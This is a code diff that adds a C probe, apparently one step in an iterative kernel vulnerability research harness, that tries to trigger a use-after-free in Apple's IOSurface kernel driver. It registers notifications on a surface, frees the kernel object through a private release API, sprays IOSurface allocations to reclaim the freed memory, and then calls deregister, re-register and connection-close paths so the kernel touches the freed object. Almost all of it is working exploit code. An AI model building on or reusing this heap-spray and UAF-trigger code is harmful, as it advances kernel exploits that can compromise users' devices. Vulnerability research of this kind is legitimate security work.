@@ -1745,6 +1745,219 @@ static volatile int r265_probed = 0;
 
 typedef void* IOSurfaceClientRef;
 
+/* r283: Trigger dangling notification via ClientRelease.
+ * r282 KEY FINDING: IOSurfaceClientRelease is the REAL destructor.
+ * CFRelease alone does NOT free the kernel object (client holds last ref).
+ * IOSurfaceLookup returns NULL after ClientRelease → kernel obj truly freed.
+ * STRATEGY: Register sel17 notification for surface, then ClientRelease
+ * WITHOUT deregistering → notification entry holds dangling kernel ref.
+ * Then trigger the notification → kernel dereferences freed IOSurface → UAF.
+ * Also: create Metal texture, ClientRelease surface, submit GPU work. */
+static void r283_probe(void) {
+    rlog("\n=== r283: Dangling Notification via ClientRelease ===\n");
+    fflush(stdout);
+
+    io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
+        IOServiceMatching("IOSurfaceRoot"));
+    rlog("  IOSurfaceRoot svc=%u\n", svc);
+
+    typedef void* IOSurfaceClientRef;
+    typedef IOSurfaceClientRef (*clientLookup_t)(uint32_t);
+    typedef void (*clientRelease_t)(IOSurfaceClientRef);
+    void *iosurfH = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_NOW);
+    clientLookup_t clLookup = (clientLookup_t)dlsym(iosurfH, "IOSurfaceClientLookup");
+    clientRelease_t clRelease = (clientRelease_t)dlsym(iosurfH, "IOSurfaceClientRelease");
+    if (!clLookup || !clRelease) {
+        rlog("  FATAL: client APIs not found\n");
+        IOObjectRelease(svc);
+        return;
+    }
+    rlog("  ClientLookup=%p ClientRelease=%p\n", (void*)clLookup, (void*)clRelease);
+
+    /* Part 1: Register notification, ClientRelease surface, trigger notification */
+    rlog("\n--- Part 1: Notification + ClientRelease (5 trials) ---\n");
+    fflush(stdout);
+    for (int trial = 0; trial < 5; trial++) {
+        io_connect_t conn = 0;
+        IOServiceOpen(svc, mach_task_self(), 0, &conn);
+        if (!conn) { rlog("  trial %d: no conn\n", trial); continue; }
+
+        CFMutableDictionaryRef p = CFDictionaryCreateMutable(NULL, 0,
+            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+        int w=64,h=64,bpe=4,bpr=64*4,pf=0x42475241,as=64*64*4;
+        CFNumberRef wn=CFNumberCreate(NULL,kCFNumberIntType,&w);
+        CFNumberRef hn=CFNumberCreate(NULL,kCFNumberIntType,&h);
+        CFNumberRef bn=CFNumberCreate(NULL,kCFNumberIntType,&bpe);
+        CFNumberRef rn=CFNumberCreate(NULL,kCFNumberIntType,&bpr);
+        CFNumberRef pfn=CFNumberCreate(NULL,kCFNumberIntType,&pf);
+        CFNumberRef asn=CFNumberCreate(NULL,kCFNumberIntType,&as);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceWidth"),wn);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceHeight"),hn);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceBytesPerElement"),bn);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceBytesPerRow"),rn);
+        CFDictionarySetValue(p,CFSTR("IOSurfacePixelFormat"),pfn);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceAllocSize"),asn);
+        CFRelease(wn);CFRelease(hn);CFRelease(bn);CFRelease(rn);CFRelease(pfn);CFRelease(asn);
+
+        IOSurfaceRef s = IOSurfaceCreate(p);
+        CFRelease(p);
+        uint32_t sid = IOSurfaceGetID(s);
+
+        /* Register notification for this surface */
+        mach_port_t wp = MACH_PORT_NULL;
+        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &wp);
+        mach_port_insert_right(mach_task_self(), wp, wp, MACH_MSG_TYPE_MAKE_SEND);
+        uint64_t ref = 0x6666 + trial;
+        uint64_t inp[3] = {sid, 0, 0};
+        kern_return_t kr = IOConnectCallAsyncMethod(conn, 17, wp, &ref, 1,
+            NULL, 0, inp, 24, NULL, NULL, NULL, NULL);
+        rlog("  trial %d: id=%u sel17_reg=0x%x\n", trial, sid, kr);
+
+        if (kr != 0) {
+            CFRelease(s);
+            mach_port_destroy(mach_task_self(), wp);
+            IOServiceClose(conn);
+            continue;
+        }
+
+        /* Get client and release it — this FREES the kernel surface */
+        IOSurfaceClientRef cl = clLookup(sid);
+        rlog("    client=%p\n", cl);
+        CFRelease(s);
+        rlog("    CFRelease done\n");
+        clRelease(cl);
+        rlog("    ClientRelease done — kernel surface FREED\n");
+
+        /* Verify surface is gone */
+        IOSurfaceRef check = IOSurfaceLookup(sid);
+        rlog("    lookup after free: %p (expect NULL)\n", (void*)check);
+        if (check) CFRelease(check);
+
+        /* Spray IOSurface objects to reclaim freed memory */
+        IOSurfaceRef spray[64];
+        int spray_count = 0;
+        for (int i = 0; i < 64; i++) {
+            CFMutableDictionaryRef sp = CFDictionaryCreateMutable(NULL, 0,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            CFNumberRef swn=CFNumberCreate(NULL,kCFNumberIntType,&w);
+            CFNumberRef shn=CFNumberCreate(NULL,kCFNumberIntType,&h);
+            CFNumberRef sbn=CFNumberCreate(NULL,kCFNumberIntType,&bpe);
+            CFNumberRef srn=CFNumberCreate(NULL,kCFNumberIntType,&bpr);
+            CFNumberRef spfn=CFNumberCreate(NULL,kCFNumberIntType,&pf);
+            CFNumberRef sasn=CFNumberCreate(NULL,kCFNumberIntType,&as);
+            CFDictionarySetValue(sp,CFSTR("IOSurfaceWidth"),swn);
+            CFDictionarySetValue(sp,CFSTR("IOSurfaceHeight"),shn);
+            CFDictionarySetValue(sp,CFSTR("IOSurfaceBytesPerElement"),sbn);
+            CFDictionarySetValue(sp,CFSTR("IOSurfaceBytesPerRow"),srn);
+            CFDictionarySetValue(sp,CFSTR("IOSurfacePixelFormat"),spfn);
+            CFDictionarySetValue(sp,CFSTR("IOSurfaceAllocSize"),sasn);
+            CFRelease(swn);CFRelease(shn);CFRelease(sbn);CFRelease(srn);CFRelease(spfn);CFRelease(sasn);
+            spray[i] = IOSurfaceCreate(sp);
+            CFRelease(sp);
+            if (spray[i]) spray_count++;
+        }
+        rlog("    sprayed %d surfaces\n", spray_count);
+
+        /* NOW try to trigger the notification — this should touch the freed surface */
+        /* Try deregistering (sel18) — kernel must look up the freed surface to deregister */
+        kern_return_t dr = IOConnectCallMethod(conn, 18, NULL, 0,
+            inp, 24, NULL, NULL, NULL, NULL);
+        rlog("    sel18 deregister after free: 0x%x\n", dr);
+
+        /* Try registering again for the same (freed) surface ID */
+        uint64_t ref2 = 0x7777 + trial;
+        kr = IOConnectCallAsyncMethod(conn, 17, wp, &ref2, 1,
+            NULL, 0, inp, 24, NULL, NULL, NULL, NULL);
+        rlog("    sel17 re-register after free: 0x%x\n", kr);
+
+        /* Check for notification delivery */
+        struct { mach_msg_header_t hdr; uint8_t body[256]; } msg;
+        kern_return_t recv = mach_msg(&msg.hdr, MACH_RCV_MSG | MACH_RCV_TIMEOUT,
+            0, sizeof(msg), wp, 100, MACH_PORT_NULL);
+        rlog("    notification check: 0x%x", recv);
+        if (recv == 0) rlog(" *** GOT IT! id=0x%x ***", msg.hdr.msgh_id);
+        rlog("\n");
+
+        /* Close connection — this should trigger notification cleanup for freed surface */
+        rlog("    closing connection (should clean up dangling notification)...\n");
+        fflush(stdout);
+        IOServiceClose(conn);
+        rlog("    connection closed OK\n");
+
+        for (int i = 0; i < 64; i++) if (spray[i]) CFRelease(spray[i]);
+        mach_port_destroy(mach_task_self(), wp);
+        fflush(stdout);
+    }
+
+    /* Part 2: Multiple connections with notifications, then ClientRelease */
+    rlog("\n--- Part 2: Multiple conn notifications + ClientRelease ---\n");
+    fflush(stdout);
+    {
+        CFMutableDictionaryRef p = CFDictionaryCreateMutable(NULL, 0,
+            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+        int w=64,h=64,bpe=4,bpr=64*4,pf=0x42475241,as=64*64*4;
+        CFNumberRef wn=CFNumberCreate(NULL,kCFNumberIntType,&w);
+        CFNumberRef hn=CFNumberCreate(NULL,kCFNumberIntType,&h);
+        CFNumberRef bn=CFNumberCreate(NULL,kCFNumberIntType,&bpe);
+        CFNumberRef rn=CFNumberCreate(NULL,kCFNumberIntType,&bpr);
+        CFNumberRef pfn=CFNumberCreate(NULL,kCFNumberIntType,&pf);
+        CFNumberRef asn=CFNumberCreate(NULL,kCFNumberIntType,&as);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceWidth"),wn);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceHeight"),hn);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceBytesPerElement"),bn);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceBytesPerRow"),rn);
+        CFDictionarySetValue(p,CFSTR("IOSurfacePixelFormat"),pfn);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceAllocSize"),asn);
+        CFRelease(wn);CFRelease(hn);CFRelease(bn);CFRelease(rn);CFRelease(pfn);CFRelease(asn);
+
+        IOSurfaceRef s = IOSurfaceCreate(p);
+        CFRelease(p);
+        uint32_t sid = IOSurfaceGetID(s);
+        rlog("  surface id=%u\n", sid);
+
+        /* Register notifications from 10 different connections */
+        io_connect_t conns[10];
+        mach_port_t wps[10];
+        int reg_ok = 0;
+        for (int i = 0; i < 10; i++) {
+            IOServiceOpen(svc, mach_task_self(), 0, &conns[i]);
+            mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &wps[i]);
+            mach_port_insert_right(mach_task_self(), wps[i], wps[i], MACH_MSG_TYPE_MAKE_SEND);
+            uint64_t ref = 0x8888 + i;
+            uint64_t inp[3] = {sid, 0, 0};
+            kern_return_t kr = IOConnectCallAsyncMethod(conns[i], 17, wps[i], &ref, 1,
+                NULL, 0, inp, 24, NULL, NULL, NULL, NULL);
+            if (kr == 0) reg_ok++;
+        }
+        rlog("  registered %d/10 notifications\n", reg_ok);
+
+        /* ClientRelease to free the surface */
+        IOSurfaceClientRef cl = clLookup(sid);
+        CFRelease(s);
+        clRelease(cl);
+        IOSurfaceRef check = IOSurfaceLookup(sid);
+        rlog("  after ClientRelease: lookup=%p (expect NULL)\n", (void*)check);
+        if (check) CFRelease(check);
+
+        /* Close all connections — each one must clean up its notification for freed surface */
+        rlog("  closing 10 connections with dangling notifications...\n");
+        fflush(stdout);
+        for (int i = 0; i < 10; i++) {
+            IOServiceClose(conns[i]);
+            rlog("    conn[%d] closed OK\n", i);
+            fflush(stdout);
+        }
+        rlog("  all connections closed\n");
+
+        for (int i = 0; i < 10; i++)
+            mach_port_destroy(mach_task_self(), wps[i]);
+    }
+
+    IOObjectRelease(svc);
+    rlog("\n*** r283 probe complete ***\n");
+    fflush(stdout);
+}
+
 /* r282: Surface lifecycle + ownership probing.
  * r281 CONFIRMED: sel17/18 race fully serialized per-connection, no orphaned entries.
  * Cross-connection deregister fails (entries are per-connection).
@@ -26015,6 +26228,15 @@ new_modes:
             IOObjectRelease(r251_svc);
             r251_done:
             rlog("*** r=251 complete ***\n");
+            goto done;
+        }
+        if (rounds == 283) {
+            rlog("*** rounds=283: Dangling Notification via ClientRelease ***\n");
+            rlog("  r282 KEY: ClientRelease is REAL destructor. CFRelease alone does NOT free.\n");
+            rlog("  Testing: register sel17 notification, ClientRelease surface,\n");
+            rlog("           then trigger notification → kernel touches freed object.\n\n");
+            fflush(stdout);
+            r283_probe();
             goto done;
         }
         if (rounds == 282) {
